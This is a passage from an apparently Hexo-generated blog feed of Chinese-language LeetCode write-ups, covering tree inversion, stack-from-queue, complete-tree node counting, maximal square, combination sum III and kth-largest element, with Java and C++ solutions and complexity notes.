 cur = stack.pop();</span><br><span class="line">        <span class="keyword">if</span> (++curk == k) <span class="keyword">return</span> cur.val;</span><br><span class="line">        cur = cur.right;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> 但这种方案是比较低效的，万一k值接近于节点个数呢？也就说这种算法在最坏情况下的时间复杂度是$O(n)$，而且由于要保存节点，在最坏情况下空间复杂度也是$O(n)$。有没有更快的方法呢？</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">kthSmallest</span><span class="params">(TreeNode root, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> count = countNodes(root.left);</span><br><span class="line">    <span class="keyword">if</span> (k &lt;= count) &#123;</span><br><span class="line">        <span class="keyword">return</span> kthSmallest(root.left, k);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (k &gt; count + <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> kthSmallest(root.right, k-<span class="number">1</span>-count); <span class="comment">// 1 is counted as current node</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root.val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 树的节点个数</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">countNodes</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> + countNodes(root.left) + countNodes(root.right);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
            <tag> Binary Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[226. Invert Binary Tree]]></title>
      <url>/wiki/2017/10/30/Leetcode-226-Invert-Binary-Tree/</url>
      <content type="html"><![CDATA[<p>Invert a binary tree.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line"></span><br><span class="line">     4</span><br><span class="line">   /   \</span><br><span class="line">  2     7</span><br><span class="line"> / \   / \</span><br><span class="line">1   3 6   9</span><br><span class="line">Output:</span><br><span class="line"></span><br><span class="line">     4</span><br><span class="line">   /   \</span><br><span class="line">  7     2</span><br><span class="line"> / \   / \</span><br><span class="line">9   6 3   1</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>最开始想到的方法是递归，而且也很简单。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> TreeNode <span class="title">invertTree</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    TreeNode tmp = root.right;</span><br><span class="line">    root.right = root.left;</span><br><span class="line">    root.left = tmp;</span><br><span class="line">    invertTree(root.left);</span><br><span class="line">    invertTree(root.right);</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用DFS的递归:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> TreeNode <span class="title">invertTree</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        TreeNode tmpRight = root.right;</span><br><span class="line">        root.right = invertTree(root.left);</span><br><span class="line">        root.left = invertTree(tmpRight);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>递归的时间和空间复杂度是$O(n)$, $n$是节点数。</p>
<p>还有迭代的方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> TreeNode <span class="title">invertTreeQueue</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> LinkedList&lt;TreeNode&gt;();</span><br><span class="line">    queue.add(root);</span><br><span class="line">    <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">        TreeNode current = queue.poll();</span><br><span class="line">        TreeNode temp = current.left;</span><br><span class="line">        current.left = current.right;</span><br><span class="line">        current.right = temp;</span><br><span class="line">        <span class="keyword">if</span> (current.left != <span class="keyword">null</span>) queue.add(current.left);</span><br><span class="line">        <span class="keyword">if</span> (current.right != <span class="keyword">null</span>) queue.add(current.right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[225. Implement Stack using Queues]]></title>
      <url>/wiki/2017/10/30/Leetcode-225-mplementStackUsingQueues/</url>
      <content type="html"><![CDATA[<p>Implement the following operations of a stack using queues.</p>
<ul>
<li>push(x) – Push element x onto stack.</li>
<li>pop() – Removes the element on top of the stack.</li>
<li>top() – Get the top element.</li>
<li>empty() – Return whether the stack is empty.</li>
</ul>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MyStack stack = new MyStack();</span><br><span class="line"></span><br><span class="line">stack.push(1);</span><br><span class="line">stack.push(2);  </span><br><span class="line">stack.top();   // returns 2</span><br><span class="line">stack.pop();   // returns 2</span><br><span class="line">stack.empty(); // returns false</span><br></pre></td></tr></table></figure>
<p>Notes:</p>
<ul>
<li>You must use only standard operations of a queue – which means only <code>push to back</code>, <code>peek/pop from front</code>, <code>size</code>, and <code>is empty</code> operations are valid.</li>
<li>Depending on your language, queue may not be supported natively. You may simulate a queue by using a list or deque (double-ended queue), as long as you use only standard operations of a queue.</li>
<li>You may assume that all operations are valid (for example, no pop or top operations will be called on an empty stack).</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>很简单，直接上代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"><span class="keyword">import</span> java.util.Queue;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyStack</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Queue&lt;Integer&gt; queue;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Initialize your data structure here. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyStack</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        queue = <span class="keyword">new</span> LinkedList&lt;Integer&gt;();</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Push element x onto stack. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        queue.add(x);</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">1</span>, n = queue.size();</span><br><span class="line">        <span class="keyword">while</span> (i++ &lt; n) &#123;</span><br><span class="line">            queue.add(queue.poll());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Removes the element on top of the stack and returns that element. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> queue.poll();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Get the top element. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">top</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> queue.peek();</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Returns whether the stack is empty. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">empty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> queue.isEmpty();   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MyStack object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MyStack obj = new MyStack();</span></span><br><span class="line"><span class="comment"> * obj.push(x);</span></span><br><span class="line"><span class="comment"> * int param_2 = obj.pop();</span></span><br><span class="line"><span class="comment"> * int param_3 = obj.top();</span></span><br><span class="line"><span class="comment"> * boolean param_4 = obj.empty();</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Stack </tag>
            
            <tag> Design </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[224. Basic Calculator]]></title>
      <url>/wiki/2017/10/30/Leetcode-224-Basic-Calculator/</url>
      <content type="html"><![CDATA[<p>Implement a basic calculator to evaluate a simple expression string.</p>
<p>The expression string may contain open <code>(</code> and closing parentheses <code>)</code>, the plus <code>+</code> or minus sign <code>-</code>, non-negative integers and empty spaces <code></code>.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;1 + 1&quot;</span><br><span class="line">Output: 2</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot; 2-1 + 2 &quot;</span><br><span class="line">Output: 3</span><br></pre></td></tr></table></figure>
<p>Example 3:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;(1+(4+5+2)-3)+(6+8)&quot;</span><br><span class="line">Output: 23</span><br></pre></td></tr></table></figure>
<p>Note:</p>
<ul>
<li>You may assume that the given expression is always valid.</li>
<li><strong>Do not</strong> use the <code>eval</code> built-in library function.</li>
</ul>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Stack </tag>
            
            <tag> Math </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[222. Count Complete Tree Nodes]]></title>
      <url>/wiki/2017/10/30/Leetcode-222-Count-Complete-Tree-Nodes/</url>
      <content type="html"><![CDATA[<p>Given a <strong>complete</strong> binary tree, count the number of nodes.</p>
<p>Note:</p>
<p>Definition of a complete binary tree from Wikipedia:</p>
<blockquote>
<p>In a complete binary tree every level, except possibly the last, is completely filled, and all nodes in the last level are as far left as possible. It can have between 1 and $2^h$ nodes inclusive at the last level h.</p>
</blockquote>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input: </span><br><span class="line">    1</span><br><span class="line">   / \</span><br><span class="line">  2   3</span><br><span class="line"> / \  /</span><br><span class="line">4  5 6</span><br><span class="line"></span><br><span class="line">Output: 6</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目看起来是非常简单的。要求计算完全二叉树的节点个数。这不是很简单吗？遍历每一个节点。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> count;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">countNodes</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">       count = <span class="number">0</span>;</span><br><span class="line">       traversal(root);</span><br><span class="line">       <span class="keyword">return</span> count;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">traversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span>;</span><br><span class="line">       count++;</span><br><span class="line">       traversal(root.left);</span><br><span class="line">       traversal(root.right);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>然而提交结果是超时。所以肯定不能用$O(n)$的算法了, 最好是$O(\log(n))$的算法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">height</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> root == <span class="keyword">null</span> ? -<span class="number">1</span> : <span class="number">1</span> + height(root.left);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">countNodes</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num = <span class="number">0</span>, h = height(root);</span><br><span class="line">    <span class="keyword">while</span> (root != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (height(root.right) == h - <span class="number">1</span>) &#123;</span><br><span class="line">            num += <span class="number">1</span> &lt;&lt; h;</span><br><span class="line">            root = root.right;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            num += <span class="number">1</span> &lt;&lt; h-<span class="number">1</span>;</span><br><span class="line">            root = root.left;</span><br><span class="line">        &#125;</span><br><span class="line">        h--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>树的高度<code>height(root)</code>可以连续访问左子节点得到: 单一节点的树高度为0; 如果整棵树是空的，则高度为-1。 首先确认右子树的高度是不是整棵树的高度减去1(<code>height(root.right) == h - 1</code>)。</p>
<p>如果是，则意味着左子树和右子树有相同的高度，左子树为完全二叉树，最后一个节点肯定在右子树。由于左子树的高度为$h-1$，且是完全二叉树，所以节点个数为$2^h - 1$。左子树节点数，加上根节点数1，然后迭代的加上右子树的节点数，即为整棵树的节点数。</p>
<p>如果不是，说明右子树的高度为$h-2$，且左子树不是完全二叉树，最后一个节点在左子树。右子树的节点数$2^{h-1}-1$，加上根节点数1，然后迭代的加上左子树的节点数，即为整棵树的节点数。</p>
<p>求树的高度的时间复杂度为$O(\log(n))$，一共有$O(\log(n))$次循环，总的时间复杂度为$O(\log(n)^2)$。</p>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
            <tag> Binary Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[221. Maximal Square]]></title>
      <url>/wiki/2017/10/30/Leetcode-221-Maximal-Square/</url>
      <content type="html"><![CDATA[<p>Given a 2D binary matrix filled with 0’s and 1’s, find the largest square containing only 1’s and return its area.</p>
<p>Example:</p>
<pre><strong>Input: 
</strong>
1 0 1 0 0
1 0 <font color="red">1</font> <font color="red">1</font> 1
1 1 <font color="red">1</font> <font color="red">1</font> 1
1 0 0 1 0

<strong>Output: </strong>4
</pre>

<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目有点像LeetCode 53. Maximum Subarray。不过这道题目难了很多，从一维变成了二维，从连续子数组的最大和变成了连续矩阵的最大面积。应该来说，本质上没有发生变化，但是寻找对应的状态转移方程，难度大了许多。基本思路仿照Kadane’s algorithm，也就是有<code>maxEndingHere(i,j)</code>记录到以$(i,j)$为右下角的最大矩阵，<code>maxSoFar(i,j)</code>记录从(0,0)到$(i,j)$的最大矩阵。</p>
<p>但是怎么求<code>maxEndingHere(i, j)</code>呢？一个$(i,j)$为右下角的最大矩阵，它的左边、右边、左上角肯定都是1。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dp(i, j) = min(dp(i−<span class="number">1</span>, j), dp(i−<span class="number">1</span>, j−<span class="number">1</span>), dp(i, j−<span class="number">1</span>)) + <span class="number">1</span>.</span><br></pre></td></tr></table></figure>
<p>完整的Java代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maximalSquare</span><span class="params">(<span class="keyword">char</span>[][] matrix)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (matrix == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> m = matrix.length, n = m &gt; <span class="number">0</span> ? matrix[<span class="number">0</span>].length : <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> maxSquare = <span class="number">0</span>;  <span class="comment">//maxSoFar</span></span><br><span class="line">    <span class="keyword">int</span> [][] dp = <span class="keyword">new</span> <span class="keyword">int</span>[m + <span class="number">1</span>][n + <span class="number">1</span>];  <span class="comment">//maxEndingHere</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (matrix[i - <span class="number">1</span>][j - <span class="number">1</span>] == <span class="string">'1'</span>) &#123;</span><br><span class="line">                dp[i][j] = <span class="number">1</span> +  Math.min(dp[i - <span class="number">1</span>][j - <span class="number">1</span>], Math.min(dp[i - <span class="number">1</span>][j], dp[i][j - <span class="number">1</span>]));</span><br><span class="line">                <span class="keyword">if</span> (dp[i][j] &gt; maxSquare) maxSquare = dp[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> maxSquare*maxSquare;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Leetcode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[216. Combination Sum III]]></title>
      <url>/wiki/2017/10/30/Leetcode-216-Combination-Sum-III/</url>
      <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Find all possible combinations of $k$ numbers that add up to a number $n$, given that only numbers from 1 to 9 can be used and each combination should be a unique set of numbers.</p>
<p>Note:</p>
<ul>
<li>All numbers will be positive integers.</li>
<li>The solution set must not contain duplicate combinations.</li>
</ul>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: k = 3, n = 7</span><br><span class="line">Output: [[1,2,4]]</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: k = 3, n = 9</span><br><span class="line">Output: [[1,2,6], [1,3,5], [2,3,4]]</span><br></pre></td></tr></table></figure>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这道题和前面的Combination Sum主要的区别是它规定了有k个数。所以除了base case变动以外，其他都可以保持一致。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">combinationSum3Helper</span><span class="params">(<span class="keyword">int</span> k, <span class="keyword">int</span> n, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; candidates, <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; res, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; chosen, <span class="keyword">int</span> position)</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (k==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="comment">//base case</span></span><br><span class="line">            <span class="keyword">if</span> (n==<span class="number">0</span>)&#123;</span><br><span class="line">                res.push_back(chosen);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i=position; i&lt;candidates.size(); i++)&#123;</span><br><span class="line">                <span class="comment">// choose</span></span><br><span class="line">                chosen.push_back(candidates[i]);</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// explore</span></span><br><span class="line">                combinationSum3Helper(k<span class="number">-1</span>, n-candidates[i], candidates, res, chosen, i+<span class="number">1</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// unchoose</span></span><br><span class="line">                chosen.pop_back();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//Find all possible combinations of k numbers that add up to a number n</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; combinationSum3(<span class="keyword">int</span> k, <span class="keyword">int</span> n) &#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; candidates=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;, chosen;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">        combinationSum3Helper(k, n, candidates, res, chosen, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Backtracking </tag>
            
            <tag> Leetcode </tag>
            
            <tag> Array </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[215. Kth Largest Element in an Array]]></title>
      <url>/wiki/2017/10/30/Leetcode-215-Kth-Largest-Element-in-an-Array/</url>
      <content type="html"><![CDATA[<p>Find the $k$th largest element in an unsorted array. Note that it is the $k$th largest element in the sorted order, not the $k$th distinct element.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: [3,2,1,5,6,4] and k = 2</span><br><span class="line">Output: 5</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: [3,2,3,1,2,4,5,5,6] and k = 4</span><br><span class="line">Output: 4</span><br></pre></td></tr></table></figure>
<p>Note: You may assume $k$ is always valid, $1 ≤ k ≤$ array’s length.</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>题目要我们求第$k$大的元素。最直接的方法就是将数组排序，然后取出对应元素。时间复杂度是$n\log(n)$，空间复杂度为$O(1)$。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findKthLargest</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">    Arrays.sort(nums);</span><br><span class="line">    <span class="keyword">return</span> nums[nums.length - k];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
